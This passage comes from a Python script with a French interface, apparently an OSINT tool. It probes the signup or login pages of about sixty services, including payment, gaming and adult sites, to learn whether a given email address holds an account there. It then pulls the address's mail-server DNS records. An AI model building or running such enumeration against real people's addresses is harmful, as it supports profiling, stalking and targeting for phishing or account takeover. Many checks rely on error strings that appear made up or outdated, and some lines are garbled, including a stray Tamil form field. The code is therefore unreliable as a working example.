                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://signup.live.com/signup?wa=wsignin1.0&rpsnv=13&ct=1616787095&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1&id=292841&CBCXT=out&lw=1&fl=easi2&email={email}", headers=headers)
                if response.status_code == 200:
                    return "Someone already has this email address." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Amazon(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email address already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Netflix(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.netflix.com/signup/registration?locale=en-US", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is already associated with an account." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def DropBox(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                data = {'email': email}
                response = session.post("https://www.dropbox.com/register", headers=headers, data=data)
                if response.status_code == 200:
                    return "This email is already connected to a Dropbox account." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def eBay(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://signup.ebay.com/pa/crte?ru=https%3A%2F%2Fwww.ebay.com%2F", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email address is already in use." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def PayPal(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.paypal.com/signup/account", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email is already being used for a PayPal account." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Apple(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://appleid.apple.com/account", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This Apple ID is not valid." not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Twitch(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/vnd.twitchtv.v5+json',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Client-ID': 'kimne78kx3ncx6brwjyza8onw04no',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Origin': 'https://www.twitch.tv',
                    'Referer': 'https://www.twitch.tv/',
                }
                data = {'email': email}
                response = session.post("https://api.twitch.tv/kraken/users?login=test", headers=headers, data=data)
                if response.status_code == 422:
                    return "Email is already taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Discord(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/json',
                    'Origin': 'https://discord.com',
                    'Referer': 'https://discord.com/',
                }
                data = {'email': email}
                response = session.post("https://discord.com/api/v9/auth/register", headers=headers, data=data)
                if response.status_code == 400:
                    return "Email already registered." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Zoom(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://zoom.us/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "The email is already used." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Skype(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://secure.skype.com/portal/signup?intsrc=client-_-windowsdesktop-_-8.73-_-sitedirect", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "That Microsoft account doesn't exist." not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def WordPress(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://wordpress.com/start/account", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "An account already exists with this email address." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Medium(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://medium.com/plans", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is already taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Quora(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.quora.com/account/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email address is already in use." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def StackOverflow(email):
            try:
                session = requests.Session()
                headers = {
'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://stackoverflow.com/users/signup?ssrc=head&returnurl=%2fusers%2fstory%2fnew", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is invalid or already taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def GitHub(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://github.com/join", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is invalid or already taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def GitLab(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://gitlab.com/users/sign_up", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email has already been taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def BitBucket(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://bitbucket.org/account/signup/", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is already in use. Did you forget your password?" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Steam(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                data = {'email': email, 'count': 0, ' வேண்டாம்': ' வேண்டாம்'}
                response = session.post("https://store.steampowered.com/join/checkemail", headers=headers, data=data)
                if response.status_code == 200:
                    return "That email is already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def EpicGames(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.epicgames.com',
                    'Referer': 'https://www.epicgames.com/id/register/register',
                }
                data = {'email': email}
                response = session.post("https://www.epicgames.com/id/api/register/email/available", headers=headers, data=data)
                if response.status_code == 200:
                    return response.json()['available'] == False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Origin(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.origin.com',
                    'Referer': 'https://www.origin.com/usa/en-us/store/register',
                }
                data = {'email': email}
                response = session.post("https://www.origin.com/api/email/validate", headers=headers, data=data)
                if response.status_code == 200:
                    return response.json()['isValid'] == False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Ubisoft(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.ubisoft.com',
                    'Referer': 'https://www.ubisoft.com/en-us/register',
                }
                data = {'email': email}
                response = session.post("https://public-ubiservices.ubi.com/v3/users/validateemail", headers=headers, data=data)
                if response.status_code == 200:
                    return response.json()['isAvailable'] == False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def PlayStation(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.playstation.com',
                    'Referer': 'https://www.playstation.com/en-us/sign-up/',
                }
                data = {'email': email}
                response = session.post("https://account.api.playstation.com/api/v1/accounts/check-availability", headers=headers, data=data)
                if response.status_code == 200:
                    return response.json()['emailAvailable'] == False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Nintendo(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://accounts.nintendo.com',
                    'Referer': 'https://accounts.nintendo.com/register',
                }
                data = {'email': email}
                response = session.post("https://accounts.nintendo.com/v1/api/registration/email_availability", headers=headers, data=data)
                if response.status_code == 200:
                    return response.json()['available'] == False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Xbox(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://login.live.com',
                    'Referer': 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402b5328&scope=service%3a%3auser.profile%3a%3amsn.com&response_type=code&redirect_uri=https%3a%2f%2fwww.xbox.com%2fapi%2faccount%2foauth2%2fcallback',
                }
                data = {'email': email}
                response = session.post("https://login.live.com/oauth20_authorize.srf?client_id=00000000402b5328&scope=service%3a%3auser.profile%3a%3amsn.com&response_type=code&redirect_uri=https%3a%2f%2fwww.xbox.com%2fapi%2faccount%2foauth2%2fcallback", headers=headers, data=data)
                if response.status_code == 200:
                    return "The Microsoft account doesn't exist" not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Adobe(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://account.adobe.com/account/profile", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "An account with this email address already exists" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def LinkedInLearning(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.linkedin.com/learning/login", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "There is no account associated with" not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Coursera(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.coursera.org/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "An account with this email already exists" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Udemy(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.udemy.com/join/signup-popup/", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "There is already an account with that email address" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Skillshare(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.skillshare.com/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def KhanAcademy(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.khanacademy.org/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email address is already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Duolingo(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.duolingo.com/register", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "An account already exists with that email" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Babbel(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.babbel.com/en/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email is already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def RosettaStone(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.rosettastone.com/sign-up/", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "An account already exists for this email address" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def edX(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.edx.org/register", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "An account with this email already exists" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Strava(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.strava.com/register/free", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email is already taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def MyFitnessPal(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://account.myfitnesspal.com/account/create", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "That email address is already taken" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Fitbit(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.fitbit.com/signup", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "That email address is already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def GarminConnect(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://connect.garmin.com/en-US/signin", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Invalid email or password" not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def LastFM(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.last.fm/join", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email address already registered" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Deezer(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.deezer.com/register", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email is already used" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Tidal(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://tidal.com/register", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "This email is already registered" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Pandora(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.pandora.com/account/register", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email already exists" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def SoundCloud(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://soundcloud.com/signin", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "That email address doesn't look right" not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Vimeo(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://vimeo.com/join", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email address is already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Dailymotion(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.dailymotion.com/register", headers=headers, params={'email': email})
                if response.status_code == 200:
                    return "Email address already in use" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"
        
        email = input(Colorate.Horizontal(Colors.blue_to_cyan, "\nEntrez l'adresse e-mail à vérifier : "))

        sites = [
            Instagram, Twitter, Pinterest, Imgur, Patreon, Spotify, FireFox, LastPass, Archive, PornHub, Xnxx, Xvideo, Facebook, LinkedIn, Reddit, Google, Yahoo, Microsoft, Amazon, Netflix, DropBox, eBay, PayPal, Apple, Twitch, Discord, Zoom, Skype, WordPress, Medium, Quora, StackOverflow, GitHub, GitLab, BitBucket, Steam, EpicGames, Origin, Ubisoft, PlayStation, Nintendo, Xbox, Adobe, LinkedInLearning, Coursera, Udemy, Skillshare, KhanAcademy, Duolingo, Babbel, RosettaStone, edX, Strava, MyFitnessPal, Fitbit, GarminConnect, LastFM, Deezer, Tidal, Pandora, SoundCloud, Vimeo, Dailymotion
        ]

        site_founds = []
        found = 0
        not_found = 0
        unknown = 0
        error = 0

        for site in sites:
            result = site(email)
            if isinstance(result, bool) and result:
                site_founds.append(site.__name__)
                found += 1
                print(Colorate.Horizontal(Colors.green_to_blue, f"[+] {site.__name__}: Trouvé"))
            elif isinstance(result, bool) and not result:
                not_found += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] {site.__name__}: Non trouvé"))
            elif "Error" in str(result):
                error += 1
                print(Colorate.Horizontal(Colors.yellow_to_red, f"[Erreur] {site.__name__}: {result}"))
            else:
                unknown += 1
                print(Colorate.Horizontal(Colors.grey_to_white, f"[Inconnu] {site.__name__}: {result}"))

        print("\n--- Statistiques ---")
        print(f"Trouvé sur : {found} sites")
        print(f"Non trouvé sur : {not_found} sites")
        print(f"Erreurs : {error} sites")
        print(f"Inconnu : {unknown} sites")
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"Erreur dans le script principal : {str(e)}"))

# Ex


def email_lookup():
    """Effectue des recherches d'informations sur une adresse e-mail."""
    try:
        def get_email_info(email):
            info = {}
            try: domain_all = email.split('@')[-1]
            except: domain_all = None

            try: name = email.split('@')[0]
            except: name = None

            try: domain = re.search(r"@([^@.]+)\.", email).group(1)
            except: domain = None
            try: tld = f".{email.split('.')[-1]}"
            except: tld = None

            try: 
                mx_records = dns.resolver.resolve(domain_all, 'MX')
                mx_servers = [str(record.exchange) for record in mx_records]
                info["mx_servers"] = mx_servers
            except dns.resolver.NoAnswer:
                info["mx_servers"] = None
            except dns.resolver.NXDOMAIN:
                info["mx_servers"] = None

            try:
                spf_records = dns.resolver.resolve(domain_all, 'TXT')
                info["spf_records"] = [str(record) for record in spf_records]
            except dns.resolver.NoAnswer:
                info["spf_records"] = None
            except dns.resolver.NXDOMAIN:
                info["spf_records"] = None

            try:
                dmarc_records = dns.resolver.resolve(f'_dmarc.{domain_all}', 'TXT')
                info["dmarc_records"] = [str(record) for record in dmarc_records]
            except dns.resolver.NoAnswer:
                info["dmarc_records"] = None
            except dns.resolver.NXDOMAIN:
                info["dmarc_records"] = None

            if mx_servers:
                for server in mx_servers:
                    if "google.com" in server:
                        info["google_workspace"] = True
                    elif "outlook.com" in server:
                        info["microsoft_365"] = True

            return info, domain_all, domain, tld, name

        print(Colorate.Horizontal(Colors.yellow_to_green, "\n[📧] Recherche d'informations sur l'email..."))
        email = input(Colorate.Horizontal(Colors.blue_to_cyan, "  Entrez l'adresse email : "))

        info, domain_all, domain, tld, name = get_email_info(email)

        mx_servers = info["mx_servers"] if "mx_servers" in info else None
        spf_records = info["spf_records"] if "spf_records" in info else None
